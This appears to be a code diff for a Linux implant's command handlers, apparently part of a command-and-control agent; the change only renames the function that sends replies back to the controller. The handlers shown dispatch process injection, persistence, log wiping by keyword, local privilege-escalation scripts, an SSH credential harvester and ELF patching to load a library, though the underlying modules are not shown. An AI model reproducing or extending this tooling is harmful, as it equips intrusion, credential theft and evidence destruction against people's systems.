@@ -23,28 +23,28 @@ func runInjectLinux(cmd *cobra.Command, args []string) {
 	pid, _ := cmd.Flags().GetString("pid")
 	checksum, _ := cmd.Flags().GetString("checksum")
 	if method == "" || pid == "" || checksum == "" {
-		c2transport.C2RespPrintf(cmd, "%s", "Error: args error")
+		c2transport.NotifyC2(cmd, "%s", "Error: args error")
 		return
 	}
 	pidInt, err := strconv.ParseInt(pid, 10, 32)
 	if err != nil {
 		logging.Println("Invalid pid")
-		c2transport.C2RespPrintf(cmd, "%s", "Error: invalid pid")
+		c2transport.NotifyC2(cmd, "%s", "Error: invalid pid")
 		return
 	}
 	err = modules.InjectorHandler(int(pidInt), method, checksum)
 	if err != nil {
-		c2transport.C2RespPrintf(cmd, "%s", "Error: "+err.Error())
+		c2transport.NotifyC2(cmd, "%s", "Error: "+err.Error())
 		return
 	}
-	c2transport.C2RespPrintf(cmd, "%s", method+": success")
+	c2transport.NotifyC2(cmd, "%s", method+": success")
 }
 
 // runPersistenceLinux implements: !persistence --method <method>
 func runPersistenceLinux(cmd *cobra.Command, _ []string) {
 	method, _ := cmd.Flags().GetString("method")
 	if method == "" {
-		c2transport.C2RespPrintf(cmd, "%s", "Error: args error")
+		c2transport.NotifyC2(cmd, "%s", "Error: args error")
 		return
 	}
 
@@ -63,9 +63,9 @@ func runPersistenceLinux(cmd *cobra.Command, _ []string) {
 		err := modules.PersistAllInOne()
 		if err != nil {
 			logging.Println(err)
-			c2transport.C2RespPrintf(cmd, "%s", "Some has failed: "+err.Error())
+			c2transport.NotifyC2(cmd, "%s", "Some has failed: "+err.Error())
 		} else {
-			c2transport.C2RespPrintf(cmd, "%s", "Success")
+			c2transport.NotifyC2(cmd, "%s", "Success")
 		}
 		return
 	} else {
@@ -73,12 +73,12 @@ func runPersistenceLinux(cmd *cobra.Command, _ []string) {
 			err := persistMethod()
 			if err != nil {
 				logging.Println(err)
-				c2transport.C2RespPrintf(cmd, "%s", "Error: "+err.Error())
+				c2transport.NotifyC2(cmd, "%s", "Error: "+err.Error())
 			} else {
-				c2transport.C2RespPrintf(cmd, "%s", "Success")
+				c2transport.NotifyC2(cmd, "%s", "Success")
 			}
 		} else {
-			c2transport.C2RespPrintf(cmd, "%s", "Error: No such method available")
+			c2transport.NotifyC2(cmd, "%s", "Error: No such method available")
 		}
 	}
 }
@@ -86,9 +86,9 @@ func runPersistenceLinux(cmd *cobra.Command, _ []string) {
 // runGetRootLinux implements: !get_root
 func runGetRootLinux(cmd *cobra.Command, args []string) {
 	if os.Geteuid() == 0 {
-		c2transport.C2RespPrintf(cmd, "%s", "Warning: You already have root!")
+		c2transport.NotifyC2(cmd, "%s", "Warning: You already have root!")
 	} else {
-		c2transport.C2RespPrintf(cmd, "%s", "Deprecated")
+		c2transport.NotifyC2(cmd, "%s", "Deprecated")
 	}
 }
 
@@ -96,15 +96,15 @@ func runGetRootLinux(cmd *cobra.Command, args []string) {
 func runCleanLogLinux(cmd *cobra.Command, args []string) {
 	keyword, _ := cmd.Flags().GetString("keyword")
 	if keyword == "" {
-		c2transport.C2RespPrintf(cmd, "%s", "Error: args error")
+		c2transport.NotifyC2(cmd, "%s", "Error: args error")
 		return
 	}
 	err := modules.CleanAllByKeyword(keyword)
 	if err != nil {
-		c2transport.C2RespPrintf(cmd, "%s", err.Error())
+		c2transport.NotifyC2(cmd, "%s", err.Error())
 		return
 	}
-	c2transport.C2RespPrintf(cmd, "%s", "Done")
+	c2transport.NotifyC2(cmd, "%s", "Done")
 }
 
 // runLPELinux implements: !lpe --script_name <script_name> --checksum <checksum>
@@ -112,11 +112,11 @@ func runLPELinux(cmd *cobra.Command, args []string) {
 	scriptName, _ := cmd.Flags().GetString("script_name")
 	checksum, _ := cmd.Flags().GetString("checksum")
 	if scriptName == "" || checksum == "" {
-		c2transport.C2RespPrintf(cmd, "%s", "Error: args error")
+		c2transport.NotifyC2(cmd, "%s", "Error: args error")
 		return
 	}
 	out := modules.RunLPEHelper(scriptName, checksum)
-	c2transport.C2RespPrintf(cmd, "%s", out)
+	c2transport.NotifyC2(cmd, "%s", out)
 }
 
 // runSSHHarvesterLinux implements: !ssh_harvester --code_pattern <hex> --reg_name <reg> --stop <bool>
@@ -126,16 +126,16 @@ func runSSHHarvesterLinux(cmd *cobra.Command, args []string) {
 	stop, _ := cmd.Flags().GetBool("stop")
 	if stop && modules.SshHarvesterCancel != nil {
 		modules.SshHarvesterCancel()
-		c2transport.C2RespPrintf(cmd, "%s", "SSH harvester stopped")
+		c2transport.NotifyC2(cmd, "%s", "SSH harvester stopped")
 		return
 	}
 	codePatternBytes, err := hex.DecodeString(codePattern)
 	if err != nil {
-		c2transport.C2RespPrintf(cmd, "%s", fmt.Sprintf("Error parsing hex string: %v", err))
+		c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("Error parsing hex string: %v", err))
 		return
 	}
 	if modules.SshHarvesterRunning {
-		c2transport.C2RespPrintf(cmd, "%s", "SSH harvester is already running")
+		c2transport.NotifyC2(cmd, "%s", "SSH harvester is already running")
 	} else {
 		go modules.SshHarvester(cmd, codePatternBytes, regName)
 	}
@@ -148,24 +148,24 @@ func runElfPatchLinux(cmd *cobra.Command, args []string) {
 	targetPath, _ := cmd.Flags().GetString("target_path")
 
 	if elfPath == "" {
-		c2transport.C2RespPrintf(cmd, "Error: elf_path is required")
+		c2transport.NotifyC2(cmd, "Error: elf_path is required")
 		return
 	}
 
 	if soPath == "" {
-		c2transport.C2RespPrintf(cmd, "Error: so_path is required")
+		c2transport.NotifyC2(cmd, "Error: so_path is required")
 		return
 	}
 
 	err := modules.ElfPatcher(elfPath, soPath, targetPath)
 	if err != nil {
-		c2transport.C2RespPrintf(cmd, "Error: %v", err)
+		c2transport.NotifyC2(cmd, "Error: %v", err)
 		return
 	}
 
 	if targetPath != "" {
-		c2transport.C2RespPrintf(cmd, "Successfully patched %s to load %s", elfPath, targetPath)
+		c2transport.NotifyC2(cmd, "Successfully patched %s to load %s", elfPath, targetPath)
 	} else {
-		c2transport.C2RespPrintf(cmd, "Successfully patched %s to load library at random location", elfPath)
+		c2transport.NotifyC2(cmd, "Successfully patched %s to load library at random location", elfPath)
 	}
 }
